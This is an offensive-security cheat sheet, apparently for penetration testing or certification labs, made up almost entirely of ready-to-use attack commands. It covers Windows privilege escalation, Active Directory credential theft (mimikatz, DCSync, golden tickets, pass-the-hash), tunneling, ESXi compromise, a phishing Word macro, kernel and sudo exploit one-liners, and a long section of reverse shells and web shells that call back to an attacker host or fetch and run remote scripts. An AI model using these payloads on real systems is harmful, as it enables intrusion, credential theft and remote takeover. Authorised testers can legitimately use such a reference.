##### AlwaysInstallElevated

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
msfvenom -p windows/meterpreter/reverse_tcp lhost=<LHOST> lport=<LPORT> -f msi > shell.msi
msiexec /quiet /qn /i shell.msi
```

##### DLL Hijacking

```bash
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls .\PATH\TO\BINARY\<BINARY>.exe

# customdll.cpp:
# int main() { system("net user <USERNAME> <PASSWORD> /add"); system("net localgroup administrators <USERNAME> /add"); }
x86_64-w64-mingw32-gcc customdll.cpp --shared -o customdll.dll
Restart-Service <SERVICE>
```

##### Unquoted Service Paths

```bash
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
icacls "C:\"
icacls "C:\Program Files"
# Drop malicious exe in writable path segment, restart service
Start-Service <SERVICE>
```

##### SeBackupPrivilege

```bash
reg save hklm\system C:\Users\<USERNAME>\system.hive
reg save hklm\sam C:\Users\<USERNAME>\sam.hive
impacket-secretsdump -sam sam.hive -system system.hive LOCAL

# diskshadow method for ntds.dit
diskshadow /s script.txt
Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
```

##### SeImpersonate / SeAssignPrimaryToken

```bash
.\RogueWinRM.exe -p "C:\nc64.exe" -a "-e cmd.exe <LHOST> <LPORT>"
.\GodPotato-NET4.exe -cmd '<COMMAND>'
.\PrintSpoofer64.exe -i -c powershell
.\JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c whoami"
```

##### SeTakeOwnershipPrivilege

```bash
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant Everyone:F
copy cmd.exe utilman.exe       # click Ease of Access on logon screen for SYSTEM shell
```

##### writeDACL

```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $SecPassword)
Add-ObjectACL -PrincipalIdentity <USERNAME> -Credential $Cred -Rights DCSync
```

##### Enable RDP / WinRM

```powershell
# RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=yes

# WinRM
winrm quickconfig
```

#### PowerShell Tricks

```powershell
Set-ExecutionPolicy remotesigned
powershell.exe -noprofile -executionpolicy bypass -file .\<FILE>.ps1
Import-Module .\<FILE>

# Switching user context
$password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $password)
Enter-PSSession -ComputerName <RHOST> -Credential $cred

# Execute remote commands as another user
$pass = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $pass)
Invoke-Command -computername <COMPUTERNAME> -Credential $cred -command {whoami}

# .NET Reflection
$bytes = (Invoke-WebRequest "http://<LHOST>/<FILE>.exe" -UseBasicParsing).Content
$assembly = [System.Reflection.Assembly]::Load($bytes)

# Base64 encode command
$Text = 'IEX(...)'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)
powershell -nop -w hidden -e $EncodedText
```

#### Active Directory

##### Manual Enumeration

```powershell
net user /domain
net group /domain
net group "<GROUP>" /domain
Get-NetDomain
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetGroup | select cn
Get-NetGroup "<GROUP>" | select member
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
Find-LocalAdminAccess
Get-NetSession -ComputerName <RHOST>
Convert-SidToName S-1-5-21-...
```

##### Object Permission Enumeration

| Permission | Description |
| --- | --- |
| GenericAll | Full permissions on object |
| GenericWrite | Edit certain attributes |
| WriteOwner | Change ownership |
| WriteDACL | Edit ACEs |
| AllExtendedRights | Change/reset password |
| ForceChangePassword | Password change |
| Self (Self-Membership) | Add self to group |

```powershell
Get-ObjectAcl -Identity <USERNAME>
Get-ObjectAcl -Identity "<GROUP>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```

##### AS-REP Roasting

```bash
impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
impacket-GetNPUsers <DOMAIN>/<USERNAME>:<PASSWORD> -request -format hashcat -outputfile hashes.asreproast
.\Rubeus.exe asreproast /nowrap
hashcat -m 18200 hashes.asreproast /PATH/TO/WORDLIST -r /usr/share/hashcat/rules/best64.rule
```

##### Kerberoasting

```bash
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <RHOST> -request
faketime 'now + 8 hours' impacket-GetUserSPNs -dc-ip <RHOST> -request <DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-host <FQDN>
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
hashcat -m 13100 hashes.kerberoast /PATH/TO/WORDLIST -r /usr/share/hashcat/rules/best64.rule
```

##### Silver Tickets

```bash
# Gather: NTLM of service account, Domain SID, Target SPN
iwr -UseDefaultCredentials http://<RHOST>
mimikatz # sekurlsa::logonpasswords
whoami /user
mimikatz # kerberos::golden /sid:<SID> /domain:<DOMAIN> /ptt /target:<RHOST> /service:http /rc4:<NTLM> /user:<USERNAME>
klist
```

##### Golden Tickets

```bash
mimikatz # lsadump::lsa /patch                    # get krbtgt hash
mimikatz # kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH> /ptt
.\PsExec.exe \\<RHOST> cmd                        # use hostname, not IP
```

##### DCSync

```bash
mimikatz # lsadump::dcsync /user:<DOMAIN>\Administrator
impacket-secretsdump -just-dc-user Administrator <DOMAIN>/<USERNAME>:"<PASSWORD>"@<RHOST>
```

##### Pass the Hash

```bash
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@<RHOST>
impacket-psexec <DOMAIN>/administrator@<RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
xfreerdp /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /dynamic-resolution +clipboard
```

##### Lateral Movement

```powershell
# WMI
wmic /node:<RHOST> /user:<USERNAME> /password:<PASSWORD> process call create "cmd"

# WinRS
winrs -r:<RHOST> -u:<USERNAME> -p:<PASSWORD> "cmd /c hostname & whoami"
winrs -r:<RHOST> -u:<USERNAME> -p:<PASSWORD> "powershell -nop -w hidden -e <B64>"

# PSExec
.\PsExec64.exe -i \\<RHOST> -u <DOMAIN>\<USERNAME> -p <PASSWORD> cmd
```

##### Volume Shadow Copy (ntds.dit)

```bash
vshadow.exe -nw -p C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit C:\ntds.dit.bak
reg.exe save hklm\system C:\system.bak
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

#### AD CS (Active Directory Certificate Services)

```bash
certipy find -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -vulnerable -stdout
```

| ESC | Technique |
| --- | --- |
| ESC1 | Misconfigured template — enroll with alt UPN |
| ESC2 | Any Purpose EKU abuse |
| ESC3 | Enrollment agent template |
| ESC4 | Writable template ACL |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA |
| ESC7 | Vulnerable CA ACL |
| ESC8 | NTLM relay to AD CS HTTP |
| ESC9 | No security extensions |
| ESC10 | Weak certificate mappings |

```bash
# ESC1
certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE> -upn administrator@<DOMAIN>
certipy auth -pfx administrator.pfx -dc-ip <RHOST>

# ESC8 - NTLM Relay
certipy relay -target 'http://<CA>'
python3 PetitPotam.py <RHOST> <DOMAIN>
certipy auth -pfx dc.pfx -dc-ip <RHOST>
export KRB5CCNAME=dc.ccache
impacket-secretsdump -k -no-pass <DOMAIN>/'dc$'@<DOMAIN>
```

#### BloodHound

```bash
# Setup
sudo neo4j console
bloodhound

# Collection
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -gc '<DOMAIN>' -ns <RHOST> -c all --zip
KRB5CCNAME=user.name.ccache faketime 'now + 8 hours' bloodhound-python -k -u user.name -d FQDN -c All -ns <IP> --disable-autogc

# Kerberos time skew
faketime 'now + 8 hours' bloodhound-python -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -dc <DOMAIN> -c all --disable-autogc
```

#### NetExec

```bash
# SMB
netexec smb <RHOST> -u '' -p '' --shares
netexec smb <RHOST> -u 'guest' -p '' --rid-brute | grep 'SidTypeUser' | awk '{print $6}'
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sam
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --lsa
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy
netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>' -x "whoami"

# LDAP
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting hashes.kerberoasting
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c All

# WinRM
netexec winrm <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d .
```

#### Evil-WinRM

```bash
evil-winrm -i <RHOST> -u <USERNAME> -p <PASSWORD>
evil-winrm -i <RHOST> -c /PATH/TO/<CERT>.crt -k /PATH/TO/<KEY>.key -u <USERNAME> -S
evil-winrm -i <RHOST> -r <REALM>
```

#### Impacket Reference

```bash
impacket-GetADUsers -all -dc-ip <RHOST> <DOMAIN>/
impacket-GetNPUsers <DOMAIN>/<USERNAME> -request -no-pass -dc-ip <RHOST>
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <RHOST> -request
impacket-lookupsid <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
impacket-secretsdump <DOMAIN>/<USERNAME>@<RHOST>
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
impacket-psexec <USERNAME>@<RHOST>
impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-smbclient <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
impacket-ntlmrelayx -t ldap://<RHOST> --no-wcf-server --escalate-user <USERNAME>
impacket-findDelegation <DOMAIN>/<USERNAME> -hashes :<HASH>
impacket-getST <DOMAIN>/<USERNAME> -spn <USERNAME>/<RHOST> -hashes :<HASH> -impersonate <USERNAME>
impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>

export KRB5CCNAME=<USERNAME>.ccache
impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```

#### bloodyAD

```bash
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type user
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr ms-DS-MachineAccountQuota
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr ms-Mcs-AdmPwd
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add groupMember '<GROUP>' '<USERNAME>'
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac <USERNAME> DONT_REQ_PREAUTH
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set password '<USERNAME>' '<PASSWORD>'
```

#### Shadow Credentials

```bash
python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<OBJECT>' --action 'add' --filename <OBJECT>
python3 gettgtpkinit.py <DOMAIN>/<USERNAME> -cert-pfx <USERNAME>.pfx -pfx-pass '<PASSWORD>' <USERNAME>.ccache
export KRB5CCNAME=<USERNAME>.ccache
python3 getnthash.py <DOMAIN>/<USERNAME> -key <KEY>
```

#### PassTheCert

```bash
certipy-ad cert -pfx <CERTIFICATE>.pfx -nokey -out <CERTIFICATE>.crt
certipy-ad cert -pfx <CERTIFICATE>.pfx -nocert -out <CERTIFICATE>.key
python3 passthecert.py -domain '<DOMAIN>' -dc-host '<DOMAIN>' -action 'modify_user' -target '<USERNAME>' -new-pass '<PASSWORD>' -crt ./<CERTIFICATE>.crt -key ./<CERTIFICATE>.key
```

#### Rubeus

```bash
.\Rubeus.exe dump /nowrap
.\Rubeus.exe asreproast /nowrap
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe tgtdeleg /nowrap
.\Rubeus.exe asktgt /user:Administrator /certificate:<CERT> /getcredentials
.\Rubeus.exe ptt /ticket:<KIRBI_FILE>
```

#### RunasCs

```bash
.\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT>
.\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT> --bypass-uac
.\RunasCs.exe -d <DOMAIN> "<USERNAME>" '<PASSWORD>' cmd.exe -r <LHOST>:<LPORT>
```

#### Seatbelt

```bash
.\Seatbelt.exe -group=system
.\Seatbelt.exe -group=all
```

#### PrivescCheck

```bash
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"
```

#### Account Operators Group → DCSync Path

```bash
net user <USERNAME> <PASSWORD> /add /domain
net group "Exchange Windows Permissions" /add <USERNAME>
# Import PowerView, then:
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=<DOMAIN>,DC=<DOMAIN>" -PrincipalIdentity <USERNAME> -Rights DCSync
impacket-secretsdump '<USERNAME>:<PASSWORD>@<RHOST>'
```

#### pwncat

```bash
pwncat-cs -lp <LPORT>
(local) pwncat$ download /PATH/TO/FILE/<FILE> .
(local) pwncat$ upload /PATH/TO/FILE/<FILE> /PATH/TO/FILE/<FILE>
# ctrl+d = back to pwncat shell
```

#### rpcclient

```bash
rpcclient -U "" <RHOST>
rpcclient -U 'username%password' <RHOST> -c enumdomusers
rpcclient -U 'username%password' <RHOST> -c "queryuser <USERNAME>"
rpcclient -U 'username%password' <RHOST> -c "netshareenumall"
```

---

### Port Forwarding & Tunneling

> **Single reference section** — use the appropriate tool based on your access.

#### Ligolo-ng (Recommended)

```bash
# On attacker
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -laddr <LHOST>:443 -selfcert

# On target
./agent -connect <LHOST>:443 -ignore-cert

# In ligolo-ng console
session
[Agent] » ifconfig
sudo ip r add 172.16.1.0/24 dev ligolo
[Agent] » start

# Port forwarding via Ligolo
[Agent] » listener_add --addr <RHOST>:<LPORT> --to <LHOST>:<LPORT> --tcp
```

Download: https://github.com/nicocha30/ligolo-ng/releases (use v0.6.2+)

#### Chisel

```bash
# SOCKS5 / Proxychains (attacker acts as server)
./chisel server -p 9002 -reverse -v          # attacker
./chisel client <LHOST>:9002 R:socks         # target

# Single port forward
./chisel server -p 9002 -reverse -v                       # attacker
./chisel client <LHOST>:9002 R:3000:127.0.0.1:3000        # target
```

#### SSH Tunneling

```bash
# Local port forward (attacker accesses target internal service)
ssh -N -L 0.0.0.0:4455:<INTERNAL_HOST>:445 <USERNAME>@<PIVOT>

# Dynamic (SOCKS) — use with proxychains
ssh -N -D 0.0.0.0:9999 <USERNAME>@<PIVOT>
# proxychains.conf: socks5 <PIVOT_IP> 9999

# Remote port forward (target calls back to attacker)
ssh -N -R 127.0.0.1:2345:<INTERNAL_HOST>:5432 <USERNAME>@<LHOST>

# Remote dynamic
ssh -N -R 9998 <USERNAME>@<LHOST>
# proxychains.conf: socks5 127.0.0.1 9998
```

#### Socat

```bash
socat -ddd TCP-LISTEN:2345,fork TCP:<RHOST>:5432    # on pivot host
psql -h <PIVOT_IP> -p 2345 -U postgres               # on attacker
```

#### sshuttle

```bash
sshuttle -r <USERNAME>@<PIVOT>:2222 10.10.100.0/24 172.16.50.0/24
```

#### Plink (Windows)

```bash
plink.exe -ssh -l <USERNAME> -pw <PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 <LHOST>
xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:127.0.0.1:9833    # on attacker
```

#### Netsh (Windows)

```bash
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=<PIVOT_IP> connectport=22 connectaddress=<INTERNAL_HOST>
netsh advfirewall firewall add rule name="pf_ssh" protocol=TCP dir=in localip=<PIVOT_IP> localport=2222 action=allow
# Cleanup:
netsh advfirewall firewall delete rule name="pf_ssh"
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=<PIVOT_IP>
```

#### powercat

```bash
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"
```

#### Proxychains

```bash
tail /etc/proxychains4.conf
proxychains nmap -vvv -sT --top-ports=20 -Pn -n <TARGET>
proxychains smbclient -p 4455 //<TARGET>/<SHARE> -U <USERNAME> --password=<PASSWORD>
```

---

### Virtualization & Hypervisor Attacks

> Research section covering lateral movement from guest VMs to ESXi hypervisor management interfaces via network misconfiguration — relevant to flat/poorly segmented networks.

#### ESXi Management Interface Ports

| Port | Service |
| --- | --- |
| 443 | vSphere Web Client / HTTPS API |
| 902 | VMware ESXi (VMRC / datastore) |
| 5989 | CIM (WBEM / hardware monitoring) |
| 8080 | vSphere SDK / HTTP API |
| 9080 | io-tunneld (older ESXi) |

#### Reachability Check from Guest VM

```bash
# Identify ESXi host IP (often the default gateway of the VM segment)
ip route
ip neigh

# Port check against ESXi management interface
for port in 443 902 5989 8080; do
    timeout 1 bash -c "</dev/tcp/<ESXi_IP>/$port" 2>/dev/null && echo "Port $port OPEN" || echo "Port $port closed"
done

nc -zv <ESXi_IP> 443 902 5989 8080
nmap -sT -p 443,902,5989,8080 <ESXi_IP> -Pn
```

#### ESXi Fingerprinting

```bash
# Confirm ESXi via HTTP headers / banner
curl -k -I https://<ESXi_IP>/
curl -k https://<ESXi_IP>/ui/             # vSphere HTML5 UI
curl -k https://<ESXi_IP>/sdk/           # vSphere SDK endpoint

# CIM/WBEM enumeration (port 5989)
curl -k https://<ESXi_IP>:5989/

# Version disclosure
curl -sk https://<ESXi_IP>/host/environ
```

#### vCenter Discovery

```bash
# vCenter is often on a separate management network — look for:
# - Different IP from ESXi host
# - Port 443 with vCenter-specific paths

curl -k https://<TARGET>/ui/              # vSphere Client
curl -k https://<TARGET>/vsphere-client/  # Legacy Flash client
curl -k https://<TARGET>/rest/            # vSphere REST API
curl -k https://<TARGET>/sdk/            # SOAP API

# Enumerate via DNS
dig vcenter.<DOMAIN>
dig @<DNS_IP> _vlso._tcp.<DOMAIN> SRV
```

#### ESXi Default Credentials

```
root:(blank)
root:vmware
root:password
root:Admin@123
dcui:(blank)
```

#### ESXi Authentication (if creds obtained)

```bash
# Login via API
curl -k -u 'root:<PASSWORD>' https://<ESXi_IP>/sdk/

# PowerCLI (Windows)
Connect-VIServer -Server <ESXi_IP> -User root -Password <PASSWORD>
Get-VM
Get-Datastore
```

#### VMDK Exposure

```bash
# If datastore is accessible (port 902 or NFS/CIFS shares exposed)
# List datastores via API
curl -k -u 'root:<PASSWORD>' https://<ESXi_IP>/sdk/ --data '<SOAP_ENVELOPE>'

# Mount VMDK locally for offline analysis
# On Linux (vmware-vdiskmanager or qemu-nbd):
sudo modprobe nbd
sudo qemu-nbd -r -c /dev/nbd0 /path/to/disk.vmdk
sudo mount /dev/nbd0p1 /mnt/vmdk

# Extract credential files from Windows VMDK
ls /mnt/vmdk/Windows/System32/config/     # SAM, SYSTEM, SECURITY
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

#### Blast Radius Assessment

```bash
# From ESXi access — enumerate all VMs
# Via esxcli (if SSH enabled on ESXi)
ssh root@<ESXi_IP>
esxcli vm process list
esxcli storage filesystem list
vim-cmd vmsvc/getallvms
vim-cmd vmsvc/power.getstate <VMID>

# Snapshot enumeration (may contain credential material)
vim-cmd vmsvc/snapshot.get <VMID>
find /vmfs/volumes/ -name "*.vmem" 2>/dev/null    # VM memory snapshots
find /vmfs/volumes/ -name "*.vmsn" 2>/dev/null    # VM suspend files
```

#### ESXi Network Misconfiguration Context

```bash
# On guest VM — check if management VLAN is reachable
# Signs of flat network: ESXi mgmt IP is in same /24 as guest VM
# or gateway IP responds on port 443/902

# Test from guest VM
traceroute <ESXi_IP>
arp -n | grep <ESXi_IP>

# If ESXi is directly adjacent (1 hop), network is likely flat/unsegmented
```

---

### Social Engineering Tools

#### Microsoft Office Word Macro (Phishing)

```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    ' Paste base64-encoded powershell payload split into 50-char chunks:
    Str = Str + "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad"
    ' ...
    CreateObject("Wscript.Shell").Run Str
End Sub
```

```bash
# Encode payload (pwsh)
$Text = '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);...'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
[Convert]::ToBase64String($Bytes)
```

#### Windows Library Files (WebDAV Phishing)

```bash
pip3 install wsgidav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /PATH/TO/webdav/
```

```xml
<!-- config.Library-ms -->
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation><url>http://<LHOST></url></simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

```bash
# Send phishing email with attachment
swaks --server <RHOST> -t <EMAIL> --from <EMAIL> --header "Subject: Staging Script" --body <FILE>.txt --attach @<FILE> --suppress-data -ap
```

---

## CVEs & LPE Techniques

| CVE | Description |
| --- | --- |
| CVE-2014-6271 | Shellshock RCE |
| CVE-2016-5195 | Dirty COW LPE |
| CVE-2017-0144 | EternalBlue (MS17-010) RCE |
| CVE-2019-14287 | Sudo Bypass (`sudo -u#-1`) |
| CVE-2020-1472 | ZeroLogon PE |
| CVE-2021-3156 | Sudo/sudoedit LPE |
| CVE-2021-44228 | Log4Shell RCE |
| CVE-2022-0847 | Dirty Pipe LPE |
| CVE-2022-22963 | Spring4Shell RCE |
| CVE-2022-31214 | Firejail LPE |
| CVE-2023-21746 | LocalPotato LPE |
| CVE-2023-22809 | sudoedit LPE |
| CVE-2023-32629/2640 | GameOverlay Ubuntu Kernel LPE |
| CVE-2023-4911 | Looney Tunables LPE |
| CVE-2023-7028 | GitLab Account Takeover |
| CVE-2024-4577 | PHP-CGI RCE |

### Key LPE One-Liners

```bash
# CVE-2019-14287 (sudo < 1.8.28)
sudo -u#-1 /bin/bash

# CVE-2023-22809 (sudoedit)
EDITOR="vi -- /etc/passwd" sudoedit /etc/motd

# CVE-2023-32629 / CVE-2023-2640 (Ubuntu GameOverlay — kernel 5.19.0-46)
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'

# CVE-2014-6271 Shellshock
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' http://<RHOST>/cgi-bin/user.sh

# GodPotato
.\GodPotato-NET4.exe -cmd '<COMMAND>'

# PrintSpoofer
.\PrintSpoofer64.exe -i -c powershell

# SharpEfsPotato
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
```

### CVE-2020-1472: ZeroLogon

```bash
python3 zerologon_tester.py <HANDLE> <RHOST>
impacket-secretsdump -just-dc -no-pass <HANDLE>\$@<RHOST>
```

### MySQL UDF LPE

```bash
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
# In MySQL:
# use mysql; create table foo(line blob);
# insert into foo values(load_file('/PATH/TO/raptor_udf2.so'));
# select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
# create function do_system returns integer soname 'raptor_udf2.so';
# select do_system('chmod +s /bin/bash');
```

---

## Payloads & Reverse Shells

### Bash

```bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
```

### Netcat

```bash
nc -e /bin/sh <LHOST> <LPORT>
mkfifo /tmp/shell; nc <LHOST> <LPORT> 0</tmp/shell | /bin/sh >/tmp/shell 2>&1; rm /tmp/shell
```

### Python

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP

```bash
php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### PowerShell

```powershell
$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Perl

```bash
perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Web Shells (PHP)

```php
<?php system($_GET['cmd']); ?>
<?php echo exec($_POST['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
```

### ASPX Web Shell

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions><remove fileExtension=".config" /></fileExtensions>
            <hiddenSegments><remove segment="web.config" /></hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
Set s = CreateObject("WScript.Shell")
Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://<LHOST>/shell.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

### Exiftool (PHP in Image)

```bash
exiftool -Comment='<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"); ?>' shell.jpg
```

### Groovy (Jenkins)

```groovy
String host="<LHOST>";int port=<LPORT>;String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

---

## Wordlists

```bash
# CeWL
cewl -d 5 -m 3 -w wordlist.txt http://<RHOST>/index.php --with-numbers

# crunch
crunch 6 6 -t foobar%%% > wordlist
crunch 5 5 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -o wordlist.txt

# CUPP (interactive)
./cupp -i

# Username Anarchy
./username-anarchy -f first,first.last,last,flast,f.last -i names.txt

